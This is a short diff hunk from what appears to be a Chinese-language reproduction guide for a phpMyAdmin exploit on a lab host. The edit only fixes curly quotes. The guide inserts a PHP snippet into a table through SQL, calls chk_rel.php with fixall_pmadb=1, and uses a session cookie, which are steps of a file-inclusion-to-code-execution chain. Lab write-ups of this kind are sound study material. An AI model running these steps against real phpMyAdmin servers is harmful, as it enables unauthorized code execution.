@@ -31,7 +31,7 @@ http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%2
 #执行SQL
 CREATE DATABASE foo;
 CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );
-INSERT INTO foo.bar SELECT ‘<?php phpinfo(); ?>’;
+INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';
 #访问
 /chk_rel.php?fixall_pmadb=1&db=foo
 #执行SQL，注意这里***换成phpmyadmin的cookie
